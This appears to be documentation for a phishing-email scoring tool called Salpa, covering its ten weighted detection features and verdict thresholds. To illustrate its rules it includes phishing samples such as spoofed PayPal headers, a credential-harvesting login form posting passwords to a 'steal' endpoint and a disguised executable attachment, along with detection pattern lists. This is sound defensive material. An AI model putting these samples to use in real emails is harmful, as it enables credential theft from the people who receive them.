# Salpa Feature Documentation

## Overall Phishing Score

Salpa produces a single **phishing score** between 0.0 and 1.0 for each analyzed email. The score is a **weighted average** of ten independent feature scores. Each feature is evaluated on its own 0.0–1.0 scale, then multiplied by its weight before being combined into the final score.

### Verdict Thresholds

| Score Range | Verdict |
|---|---|
| < 0.30 | **not suspicious** |
| 0.30 – 0.60 | **suspicious** |
| > 0.60 | **phishing or spam** |

**Not Suspicious** (score below 0.30): The email shows no significant phishing indicators. Header domains are consistent, authentication checks pass or are absent, and the body does not contain suspicious URLs, urgency language, or embedded forms. This does not guarantee the email is safe, but none of the analyzed features raised concern.

**Suspicious** (score 0.30 – 0.60): The email triggers one or more phishing indicators at moderate confidence. Common causes include a single mismatched header, a few urgency keywords, or a URL with mild anomalies. Emails in this range warrant manual review — they may be legitimate messages with unusual characteristics, or phishing attempts that are only partially disguised.

**Phishing or Spam** (score above 0.60): The email exhibits strong and correlated phishing signals across multiple features. Typical patterns include a spoofed sender domain paired with failing authentication, deceptive URLs, high-pressure language, and dangerous attachments or embedded credential-harvesting forms. Emails at this level should be treated as likely malicious and escalated or quarantined.

### Minimum Score Floors

Two floor rules prevent phishing emails from being classified as "not suspicious" when strong signals are present but diluted by many clean features:

1. **Single strong signal**: If any single feature scores above 0.7 but the weighted average falls below 0.30, the phishing score is raised to **0.30** ("suspicious"). This prevents one dominant signal (e.g., all authentication failing) from being diluted by many benign features.

2. **Multiple moderate signals**: If three or more features score above 0.3 but the weighted average still falls below 0.30, the phishing score is raised to **0.30** ("suspicious"). This catches emails where several features fire at moderate levels — a pattern that strongly correlates with phishing even when no single feature dominates.

### Feature Weights

| Feature | Weight |
|---|---|
| Sender Integrity | 0.20 |
| Authentication Headers | 0.18 |
| Suspicious URLs | 0.14 |
| Brand Impersonation | 0.10 |
| Image-Only Email | 0.08 |
| Gibberish Text | 0.08 |
| Urgency Language | 0.06 |
| Header Anomalies | 0.06 |
| Attachment Risk | 0.06 |
| HTML Forms | 0.04 |

---

## Features

### 1. Sender Integrity (weight: 0.20)

**What it checks:** Validates the consistency of the three sender-related headers: `From`, `Return-Path` (envelope sender), and `Reply-To`. Legitimate emails almost always have these domains match because the sending infrastructure belongs to the same organization. Phishing emails frequently spoof the `From` address while using attacker-controlled domains in the `Return-Path` (to receive bounces) and `Reply-To` (to receive victim replies).

**Two sub-checks:**

1. **Return-Path mismatch** — The `Return-Path` domain differs from the `From` domain. This indicates the envelope sender is a different entity than the visible sender. Contributes 0.5 to the score.

2. **Reply-To mismatch** — The `Reply-To` domain differs from the `From` domain. This means victim replies would go to an attacker-controlled mailbox. Contributes 0.5 to the score.

Both sub-checks firing together produce a score of 1.0, indicating the email is almost certainly spoofed.

**How it scores:**

| Condition | Score |
|---|---|
| All sender headers consistent | 0.0 |
| No Return-Path or Reply-To to compare | 0.0 |
| From domain could not be extracted | 0.5 |
| Return-Path domain differs from From | 0.5 |
| Reply-To domain differs from From | 0.5 |
| Both Return-Path and Reply-To differ | 1.0 |

**Malicious example:**
```
From: PayPal Support <support@paypal.com>
Return-Path: <alerts@paypa1-security.com>
Reply-To: billing-verify@paypa1-security.com
```
The visible sender appears to be PayPal, but both the envelope sender and reply address point to an attacker-controlled lookalike domain. Both sub-checks fire. Score: **1.0**.

---

### 2. Authentication Headers (weight: 0.18)

**What it checks:** Examines the `Authentication-Results` and `Received-SPF` headers for the status of three standard email authentication mechanisms:

- **SPF** (Sender Policy Framework) — verifies the sending server is authorized for the sender's domain.
- **DKIM** (DomainKeys Identified Mail) — verifies the email content has not been tampered with via cryptographic signature.
- **DMARC** (Domain-based Message Authentication, Reporting & Conformance) — policy layer that ties SPF and DKIM to the From domain.

**How it scores:**

| Condition | Score |
|---|---|
| All three pass | 0.0 |
| No authentication headers present at all | 0.5 |
| SPF passes but DKIM and DMARC both missing | 1.0 |
| Otherwise | (number of failing or missing checks) / 3 |

The SPF-only subrule deserves special attention: attackers who control their own sending domain can trivially pass SPF by adding the correct DNS records. Without DKIM (cryptographic message signing) and DMARC (policy enforcement), SPF alone provides no meaningful assurance that the email is legitimate. Salpa treats this combination as maximum risk.

**Malicious examples:**

SPF pass with no other verification:
```
Authentication-Results: mx.example.com;
    spf=pass smtp.mailfrom=info@attacker-domain.com;
    dkim=none (message not signed);
    dmarc=bestguesspass action=none
```
SPF passes because the attacker controls the domain's DNS, but no DKIM signature and no DMARC policy exist. Score: **1.0**.

All three fail:
```
Authentication-Results: mx.example.com;
    spf=fail smtp.mailfrom=alerts@paypa1-security.com;
    dkim=fail header.d=paypa1-security.com;
    dmarc=fail header.from=paypal.com
```
All three mechanisms fail. Score: **1.0**.

---

### 3. Suspicious URLs (weight: 0.14)

**What it checks:** Extracts all URLs from the email body (both HTML links and plain-text URLs) and inspects them for six categories of suspicious behavior, split into major and minor issues:

**Major issues (0.4 each):**
- **IP address hosts** — URLs pointing to raw IP addresses (e.g., `http://192.168.1.1/login`) instead of domain names.
- **Excessive subdomains** — Hostnames with more than three levels of subdomains (e.g., `secure.login.paypal.com.attacker.com`), a common obfuscation technique.
- **Anchor text mismatch** — HTML links where the visible text looks like a legitimate domain but the actual `href` points somewhere else (e.g., the text says `paypal.com` but the link goes to `paypa1.com`).

**Minor issues (0.2 each):**
- **Suspicious TLD** — URLs using top-level domains commonly associated with abuse: `.xyz`, `.tk`, `.click`, `.top`, `.buzz`, `.icu`, `.ml`, `.ga`, `.cf`, `.gq`, `.shop`, `.beauty`, `.live`, `.life`, `.online`, `.site`, `.club`, `.fun`, `.work`, `.rest`, `.fit`, `.surf`, `.quest`, `.sbs`.
- **URL shortener** — URLs using known shortening services (`bit.ly`, `tinyurl.com`, `goo.gl`, `t.co`, `ow.ly`, `is.gd`, `buff.ly`, `rebrand.ly`, `shorturl.at`, `cutt.ly`, `rb.gy`, `trib.al`, `v.gd`) that hide the true destination.
- **Hacked CMS path** — URL paths indicating a compromised content management system being used to host phishing pages. Detected patterns include WordPress (`wp-content/`, `wp-includes/`, `wp-admin/`, `wp-track.php`, `xmlrpc.php`), Joomla (`administrator/`, `components/com_*`), Drupal (`sites/default/files/`, `misc/*.php`, `modules/*.php`), Magento (`magento/`, `skin/frontend/`, `downloader/`), and generic (`cgi-bin/*.php`).

**How it scores:** Major issues contribute 0.4 each, minor issues contribute 0.2 each, capped at 1.0. No issues results in 0.0.

**Malicious example:**
```html
<a href="http://192.168.1.1/paypal-login">paypal.com/verify</a>
```
This triggers two major issues: IP address host and anchor text mismatch. Score: **0.8**.

**Hacked CMS example:**
```
https://axobox.com/vt/wp-track.php
```
A legitimate-looking domain hosting a WordPress tracking script used for phishing redirects. Score: **0.2** per occurrence.

---

### 4. Brand Impersonation (weight: 0.10)

**What it checks:** Detects emails that impersonate well-known brands by checking three areas against a list of 26 known brands and their legitimate domains:

**Monitored brands:** PayPal, Amazon, Apple, Microsoft, Google, Netflix, Chase, Wells Fargo, Bank of America, Citi, Binance, Coinbase, Meta/Facebook, Instagram, UPS, FedEx, DHL, USPS, WhatsApp, Telegram, Discord, Steam, Dropbox, LinkedIn, Tether, Ripple.

**Three sub-checks:**

1. **Display name impersonation** — The From header's display name contains a brand keyword but the sending domain is not in that brand's legitimate domain list. This is the strongest signal (0.9) because attackers commonly use names like `PayPal Support <attacker@evil.com>`.

2. **Body brand mentions** — The email body or subject mentions brand names but the sender domain doesn't match. Contributes 0.3 per brand found, weighted at 50%.

3. **URL brand mimicry** — URL hostnames contain a brand keyword but aren't the legitimate domain (e.g., `paypal.login.evil.com`). Contributes 0.3 per URL, weighted at 50%.

**How it scores:** Weighted combination of the three sub-checks, capped at 1.0. Display name match is the strongest signal.

| Condition | Score |
|---|---|
| No brand impersonation detected | 0.0 |
| Body mentions brand from non-brand domain | ~0.15 per brand |
| Display name impersonation | 0.9+ |

**Malicious example:**
```
From: PayPal Support <support@paypa1-security.com>
Subject: Verify your PayPal account
```
Display name contains "paypal" but domain is not `paypal.com`. Score: **0.9+**.

---

### 5. Image-Only Email (weight: 0.08)

**What it checks:** Detects image-based phishing emails where the entire visible content is a single image — often base64-encoded and wrapped in a link. This technique bypasses text-based spam filters since there are no words to analyze. Three signals are evaluated:

1. **Image-heavy with no text** — The HTML body contains `<img>` tags but fewer than 5 readable words of visible text. This indicates the email relies entirely on an image to convey its message.

2. **Base64 embedded images** — Images using inline `data:image/...;base64,` URIs rather than being hosted externally. Embedding avoids external image hosting that could be taken down and evades URL-based detection.

3. **Clickable images** — An `<img>` tag wrapped directly inside an `<a href>` tag, making the image a clickable phishing link. The victim sees an image (often mimicking a legitimate email) and clicks it, landing on a phishing page.

**How it scores:** Each signal adds 0.4 to the score, capped at 1.0.

| Condition | Score |
|---|---|
| No HTML body or no images | 0.0 |
| Images appear normal | 0.0 |
| One signal triggered | 0.4 |
| Two signals triggered | 0.8 |
| Three signals triggered | 1.0 |

**Malicious example:**
```html
<a href="https://axobox.com/vt/wp-track.php">
  <img src="data:image/png;base64,iVBORw0KGgo..." style="width:632px;height:581px;">
</a>
```
The email body is a single base64 image linked to a phishing URL. Two signals fire: base64 embedded image and clickable image. Score: **0.8**.

---

### 6. Gibberish Text (weight: 0.08)

**What it checks:** Detects random, nonsensical, or machine-generated text and header obfuscation in the email. Phishing campaigns inject blocks of gibberish characters into HTML or plain-text bodies to confuse spam filters, dilute keyword-based detection, and create unique message hashes. Salpa evaluates five signals:

**Body signals (0.35 each):**
- **Low real-word ratio** — Measures what fraction of words are recognizable common English words. Normal emails typically have at least 15–20% common words. Gibberish-padded emails often fall below 5%.
- **Consonant cluster density** — Counts runs of five or more consecutive consonants (e.g., `zcziprclovgmqkvwjafycx`). Natural language rarely produces these; random character strings produce them frequently.
- **Long word ratio** — Measures how many non-common words exceed 12 characters. Gibberish generators tend to produce uniformly long random strings.

**Header signals (0.25 each):**
- **Subject obfuscation** — Detects heavy MIME encoding (over 50% of subject encoded), trailing gibberish characters after real text, or excessive emoji/special characters in the subject line.
- **Homoglyph/non-ASCII in headers** — Flags non-ASCII characters (codepoint > 127) in the From address or Subject line (outside of MIME encoding headers). These indicate character substitution attacks where lookalike Unicode characters replace ASCII letters.

**How it scores:** Body signals contribute 0.35 each, header signals contribute 0.25 each, capped at 1.0. If fewer than 10 words are present in the body, body signals are skipped.

**Malicious example:**
```
eamjhizbcoehiszpytfkckafrqxwkugotuaauc
gllvhrrdcwgtc snwj zcziprclovgmqkvwjafycx
wjwifdhrnbgwixktrqhbaoa cdpclfokvxawp
lyoobuhvwezfobjdhrnwhzbvkqnabfpthsyvv
gnkhyolofttsevslbtd mtwbadhaaep
```
Hidden in the HTML body alongside a single phishing link. All three body signals fire: 0.9% real-word ratio, 76 consonant clusters in 112 words, and 35% of words over 12 characters. Score: **1.0**.

---

### 7. Urgency Language (weight: 0.06)

**What it checks:** Scans the subject line, plain-text body, and HTML body for keywords and phrases commonly used in phishing to pressure the victim into acting quickly without thinking. The keyword list includes:

`urgent`, `immediately`, `verify`, `suspend`, `expire`, `confirm`, `unauthorized`, `alert`, `locked`, `restricted`, `action required`, `account`, `click here`, `update your`, `within 24 hours`, `limited time`, `xrp`, `bitcoin`, `crypto`, `disabled`, `temporary`

**How it scores:** Each matched keyword adds 0.15 to the score, capped at 1.0. No matches results in 0.0.

**Malicious example:**
```
Subject: URGENT: Your account has been suspended

Dear Customer, you must verify your identity immediately
or your account will be permanently locked within 24 hours.
```
Matches: `urgent`, `account`, `suspend`, `verify`, `immediately`, `locked`, `within 24 hours` (7 keywords). Score: **1.0** (capped).

---

### 8. Header Anomalies (weight: 0.06)


**What it checks:** Looks for structural problems in the email headers that are common in phishing campaigns:

- **Missing Message-ID** — All properly configured mail servers generate a Message-ID. Its absence suggests the email was crafted by hand or by a bulk phishing tool.
- **Missing Date header** — Similarly expected in all legitimate email.
- **Suspicious X-Mailer** — The X-Mailer header identifies the software used to send the email. Certain tools are disproportionately associated with phishing campaigns: `PHPMailer`, `SwiftMailer`, `King Mailer`, `Leaf Mailer`.
- **HELO spoofing** — Analyzes the Received header chain for servers that claim to be a well-known mail provider (e.g., `smtp.gmail.com`) but connect from an IP address whose reverse DNS does not belong to that provider. This detects attackers who configure their SMTP HELO/EHLO to impersonate Gmail, Outlook, Yahoo, and other major providers to bypass reputation checks.

  **Monitored HELO identities:** `smtp.gmail.com`, `gmail-smtp`, `mail.yahoo.com`, `smtp.office365.com`, `smtp-mail.outlook.com`, `smtp.mail.me.com`, `smtp.zoho.com`, `smtp.aol.com`, `smtp.protonmail.ch`, `smtp.fastmail.com`.

**How it scores:** Each anomaly found adds 0.3 to the score, capped at 1.0. No anomalies score 0.0.

**HELO spoofing example:**
```
Received: from smtp.gmail.com (unknown [43.230.161.16])
    by serlogal.arnoia.com (Postfix) with ESMTPSA id EAB66C1C49
```
The server claims to be `smtp.gmail.com` but the connecting IP resolves to `unknown` — not a Google address. Score: **0.3**.

**Combined example:**
```
X-Mailer: PHPMailer 6.5
```
(with no Message-ID header and HELO spoofing detected)

Three anomalies. Score: **0.9**.

---

### 9. Attachment Risk (weight: 0.06)

**What it checks:** Inspects the filenames of all attachments for dangerous file extensions. The following extensions are flagged:

| Category | Extensions |
|---|---|
| Executables | `.exe`, `.scr`, `.bat`, `.cmd`, `.com`, `.pif`, `.msi` |
| Scripts | `.js`, `.vbs`, `.wsf` |
| Archives | `.zip`, `.rar`, `.7z` |
| Disk images | `.iso`, `.img` |
| Web files | `.html`, `.htm` |
| Java | `.jar` |

**How it scores:** Each risky attachment adds 0.5 to the score, capped at 1.0. No attachments or only safe attachments score 0.0.

**Malicious example:**
```
Content-Disposition: attachment; filename="invoice_details.exe"
```
An executable disguised as an invoice. Score: **0.5**. Two such attachments would score **1.0**.

---

### 10. HTML Form Detection (weight: 0.04)

**What it checks:** Parses the HTML body for embedded `<form>` and `<input>` tags. Legitimate emails rarely embed interactive forms directly in the email body. Phishing emails use embedded forms to harvest credentials without the victim ever leaving the email client.

**How it scores:**

| Condition | Score |
|---|---|
| No forms or inputs detected | 0.0 |
| `<input>` tags present without a `<form>` | 0.7 |
| `<form>` tag detected | 1.0 |

**Malicious example:**
```html
<form action="http://192.168.1.1/steal" method="POST">
  <input type="text" name="email" placeholder="Email">
  <input type="password" name="password" placeholder="Password">
  <input type="submit" value="Log In">
</form>
```
A credential harvesting form embedded directly in the email. Score: **1.0**.
